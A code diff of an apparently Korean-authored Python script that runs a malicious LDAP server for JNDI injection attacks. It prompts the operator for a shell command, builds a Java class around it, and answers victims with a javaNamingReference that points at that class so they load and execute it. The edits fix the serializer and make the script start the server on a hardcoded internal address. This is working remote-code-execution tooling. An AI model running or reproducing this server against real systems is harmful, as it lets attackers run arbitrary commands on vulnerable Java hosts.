@@ -46,17 +46,18 @@ class LDAPResponse():
     #입력받은 location 및 javaClassInfo로 인스턴트 생성
     def __init__(self, queryLocation: str, javaClassInfo:dict):
         self.__queryLocation = queryLocation
-        self.__javaClassInfo : javaClassInfo
+        self.__javaClassInfo = javaClassInfo
 
     def serialize(self) -> bytes:
         s = Serializer()
         s.push_size(2)
-        for k, v in reversed(self.__attributes.items()):
+
+        for k, v in reversed(self.__javaClassInfo.items()):
             s.push_size(3).push(v.encode()).pop_size().push(b"\x04").pop_size().push(b"1")
             s.push_size().push(k.encode()).pop_size().push(b"\x04").pop_size().push(b"0")
 
         s.push(b"0\x81\x82")
-        s.push_size().push(self.__query_name.encode()).pop_size().push(b"\x04").pop_size()
+        s.push_size().push(self.__queryLocation.encode()).pop_size().push(b"\x04").pop_size()
         s.push(b"\x02\x01\x02d\x81").pop_size().push(b"0\x81")
 
         SUCCESS_RESPONSE = b"0\x0c\x02\x01\x02e\x07\n\x01\x00\x04\x00\x04\x00"
@@ -73,6 +74,7 @@ def OpenLDAPService(host, port, hport):
 
             with conn as c:
                 try:
+                    print(1)
                     timestamp = datetime.now().ctime()
                     print(colored(f"[+] Connecting by {addr[0]}:{addr[1]} ({timestamp})\n", "green"))
                     c.recv(8096)
@@ -86,10 +88,10 @@ def OpenLDAPService(host, port, hport):
                         print(colored("[-] Connection Suspended", "red"))
                         return
 
-                    command = Utils.printPrompt("command", "Command : ")
+                    command = Utils.printPrompt("command", "[?] Command : ")
                     print(colored("[+] Command was sent succefully.\n","green"))
 
-                    className = Utils.randomName(command)
+                    className = Utils.randomName()
                     Generate.generateClass(command, className)
 
                     #reponse 패킷 생성
@@ -99,7 +101,6 @@ def OpenLDAPService(host, port, hport):
                         "objectClass": "javaNamingReference",
                         "javaFactory": className
                     })
-
                     c.sendall(response.serialize())
                     time.sleep(0.5)
                     c.recv(8096)
@@ -112,4 +113,4 @@ def OpenLDAPService(host, port, hport):
                     c.close()
 
 if __name__ == "__main__":
-    print("test")
+    OpenLDAPService('192.168.50.119', 1111, 2222)
